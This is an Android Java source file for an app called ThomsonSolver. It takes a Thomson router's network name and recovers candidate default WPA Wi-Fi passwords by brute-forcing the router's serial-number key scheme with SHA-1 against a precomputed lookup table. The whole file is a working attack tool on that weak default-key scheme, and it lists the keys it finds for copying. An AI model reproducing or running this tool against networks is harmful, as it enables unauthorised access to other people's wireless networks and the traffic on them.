package com.thomson;

import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;

import android.app.Activity;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.text.ClipboardManager;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.AdapterView.OnItemClickListener;

public class ThomsonSolver extends Activity {

	WifiManager wifi;
	MessageDigest md;
	ProgressDialog progressDialog;
	TextView tv;
	ListView lv1;
	String lv_arr[]={"Android","iPhone","BlackBerry","AndroidPeople"};
	  
	/** Called when the activity is first created. */
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.new_main);

		lv1=(ListView)findViewById(R.id.ListView01);

	  lv1.setOnItemClickListener(new OnItemClickListener() {
	    public void onItemClick(AdapterView<?> parent, View view,
	        int position, long id) {
		      Toast.makeText(getApplicationContext(), ((TextView) view).getText() + " was copied to clipboard!",
		          Toast.LENGTH_SHORT).show();
		      
		      ClipboardManager clipboard = 
		          (ClipboardManager) getSystemService(CLIPBOARD_SERVICE); 

		     clipboard.setText(((TextView) view).getText());
	    }
	  });
		
		final EditText ed = (EditText) findViewById(R.id.edittext);

        Button calc = (Button) findViewById(R.id.button);
        calc.setOnClickListener(new View.OnClickListener(){
			public void onClick(View arg0) {

				try
				{
					lv1.setAdapter(new ArrayAdapter<String>(ThomsonSolver.this, android.R.layout.simple_list_item_1,
							calcKeys("Thomson" + ed.getText().toString().toUpperCase())));
				}
				catch(Exception e)
				{
					
					return;
				}
			}
		});
		/*
		lv1 = (ListView) findViewById(0);

		lv1.setAdapter(new ArrayAdapter<String>(this,
				android.R.layout.simple_list_item_1, lv_arr));/**/

	  
	  /*/**/
		// tv.setText("done");

	}
	
	public String[] calcKeys(String router)
	{
		ArrayList<String> pwList = new ArrayList<String>();
		
		FileInputStream fis;
		try {
			fis = new FileInputStream("/sdcard/auxtable.dat");
		} catch (FileNotFoundException e2) {
			 Toast.makeText(getBaseContext(), "Aux Table not found on SDCard!" , Toast.LENGTH_LONG).show();
			return null;
		}

		try {
			md = MessageDigest.getInstance("SHA1");
		} catch (NoSuchAlgorithmException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}

		byte[] routerESSID = new byte[3];
		for (int i = 0; i < 6; i += 2)
			routerESSID[i / 2] = (byte) ((Character.digit(router.substring(7)
					.charAt(i), 16) << 4) + Character.digit(router.substring(7)
					.charAt(i + 1), 16));

		byte[] cp = new byte[12];
		byte[] hash = new byte[19];
		byte[] week = new byte[3 * 36 * 36 * 36];
		cp[0] = (byte) (char) 'C';
		cp[1] = (byte) (char) 'P';
		int offset = 0;
		for (int y = 4; y <= 10; y++) {
			for (int w = 0; w <= 52; w++) {
				try {
					fis.read(week);
				} catch (IOException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
				offset = 0;
				for (int a = 0; a < 36; a++) {
					for (int b = 0; b < 36; b++) {
						for (int c = 0; c < 36; c++) {
							offset += 3;
							if (week[offset - 3 + 0] != routerESSID[0])
								continue;
							if (week[offset - 3 + 1] != routerESSID[1])
								continue;
							if (week[offset - 3 + 2] != routerESSID[2])
								continue;

							cp[2] = (byte) Character.forDigit((y / 10), 10);
							cp[3] = (byte) Character.forDigit((y % 10), 10);
							cp[4] = (byte) Character.forDigit((w / 10), 10);
							cp[5] = (byte) Character.forDigit((w % 10), 10);
							cp[6] = unkown.charectbytes0[a];
							cp[7] = unkown.charectbytes1[a];
							cp[8] = unkown.charectbytes0[b];
							cp[9] = unkown.charectbytes1[b];
							cp[10] = unkown.charectbytes0[c];
							cp[11] = unkown.charectbytes1[c];

							md.reset();
							md.update(cp);
							hash = md.digest();

							try {
								pwList.add(StringUtils.getHexString(hash).substring(0, 10).toUpperCase());
							} catch (UnsupportedEncodingException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
						}
					}
				}
			}
		}
		if(pwList.toArray().length == 0)
			return new String[]{"No matches were found!", "Try another ESSID"};
		

		String[] ret = new String[pwList.size()];
		int i = 0;
		for(String s: pwList)
			ret[i++] = s;

		return ret;
	}

	public byte[] makeSHA1Hash(byte[] input) {
		md.update(input);
		return md.digest();
	}

	protected Dialog onCreateDialog(int id) {
		switch (id) {
		case 0:
			progressDialog = new ProgressDialog(ThomsonSolver.this);
			progressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
			progressDialog.setMessage("Calculating possible keys...");
			return progressDialog;
		default:
			return null;
		}
	}

}